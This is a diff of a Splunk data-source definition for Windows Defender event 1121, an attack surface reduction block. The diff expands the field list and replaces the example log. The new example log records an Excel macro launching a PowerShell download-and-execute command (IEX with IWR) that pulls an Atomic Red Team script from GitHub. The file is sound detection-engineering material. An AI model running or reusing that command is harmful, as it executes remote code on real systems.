@@ -1,8 +1,8 @@
 name: Windows Event Log Defender 1121
 id: 84a254c5-7900-4b52-a324-a176adb7c11d
-version: 4
+version: 5
 creation_date: '2024-05-22'
-modification_date: '2026-05-13'
+modification_date: '2026-10-14'
 author: Patrick Bareiss, Splunk
 description: Logs an event when a Windows Defender attack surface reduction rule fires in block mode.
 mitre_components:
@@ -20,57 +20,88 @@ supported_TA:
 fields:
     - _time
     - ActivityID
+    - category
     - Channel
     - Computer
+    - ComputerName
+    - date
+    - date_hour
+    - date_mday
+    - date_minute
+    - date_month
+    - date_second
+    - date_wday
+    - date_year
+    - date_zone
+    - dest
     - Detection_Time
+    - Detection_time
+    - dvc
+    - dvc_nt_host
     - Engine_Version
+    - event_id
     - EventCode
     - EventData_Xml
     - EventID
     - EventRecordID
+    - EventType
+    - eventtype
+    - file_name
+    - file_path
     - Guid
+    - host
     - ID
+    - id
+    - index
+    - Inheritance_Flags
     - Inhertiance_Flags
     - Involved_File
     - Keywords
     - Level
+    - linecount
+    - LogName
+    - Message
+    - meta
     - Name
-    - New_Value
-    - Old_Value
+    - OpCode
     - Opcode
     - Parent_Commandline
     - Path
-    - ProcessID
     - Process_Name
+    - ProcessID
     - Product_Name
     - Product_Version
+    - product_version
+    - punct
     - RecordNumber
     - RuleType
     - Security_intelligence_Version
-    - SystemTime
-    - System_Props_Xml
-    - Target_Commandline
-    - Task
-    - ThreadID
-    - User
-    - UserID
-    - Version
-    - dvc
-    - dvc_nt_host
-    - event_id
-    - eventtype
-    - host
-    - id
-    - index
-    - linecount
-    - punct
+    - severity
+    - severity_id
+    - Sid
+    - SidType
+    - signature
     - signature_id
     - source
     - sourcetype
     - splunk_server
+    - System_Props_Xml
+    - SystemTime
     - tag
     - tag::eventtype
+    - Target_Commandline
+    - Task
+    - TaskCategory
+    - ThreadID
+    - timeendpos
     - timestamp
+    - timestartpos
+    - Type
+    - User
+    - user
     - user_id
+    - UserID
     - vendor_product
-example_log: <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>1121</EventID><Version>0</Version><Level>3</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-11-20T16:29:48.9847638Z'/><EventRecordID>2975</EventRecordID><Correlation ActivityID='{fb36f2d9-5b89-4566-8af5-7c1212b4797f}'/><Execution ProcessID='3488' ThreadID='7496'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>researchvmhaa</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Product Version'>4.18.23100.2009</Data><Data Name='Unused'></Data><Data Name='ID'>3B576869-A4EC-4529-8536-B80A7769E899</Data><Data Name='Detection Time'>2023-11-20T16:29:48.984Z</Data><Data Name='User'>researchvmhaa\research</Data><Data Name='Path'>C:\Users\research\AppData\Local\Temp\script.vbs</Data><Data Name='Process Name'>C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data><Data Name='Security intelligence Version'>1.401.912.0</Data><Data Name='Engine Version'>1.1.23100.2009</Data><Data Name='RuleType'>ENT\ConsR</Data><Data Name='Target Commandline'></Data><Data Name='Parent Commandline'>"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" </Data><Data Name='Involved File'></Data><Data Name='Inhertiance Flags'>0x00000000</Data></EventData></Event>
+    - Version
+example_log: |
+    <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>1121</EventID><Version>0</Version><Level>3</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-11-20T15:42:14.1274112Z'/><EventRecordID>2961</EventRecordID><Correlation ActivityID='{fde93132-9071-49aa-a116-2d8a135a3bd6}'/><Execution ProcessID='3488' ThreadID='5916'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>researchvmhaa</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Product Version'>4.18.23100.2009</Data><Data Name='Unused'></Data><Data Name='ID'>D4F940AB-401B-4EFC-AADC-AD5F3C50688A</Data><Data Name='Detection Time'>2023-11-20T15:42:14.127Z</Data><Data Name='User'>researchvmhaa\research</Data><Data Name='Path'>C:\Windows\System32\cmd.exe</Data><Data Name='Process Name'>C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data><Data Name='Security intelligence Version'>1.401.908.0</Data><Data Name='Engine Version'>1.1.23100.2009</Data><Data Name='RuleType'>ENT\ConsR</Data><Data Name='Target Commandline'>cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')</Data><Data Name='Parent Commandline'>"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\research\Desktop\macs\mac6.xls"</Data><Data Name='Involved File'>C:\Users\research\Desktop\macs\mac6.xls</Data><Data Name='Inhertiance Flags'>0x00000000</Data></EventData></Event>
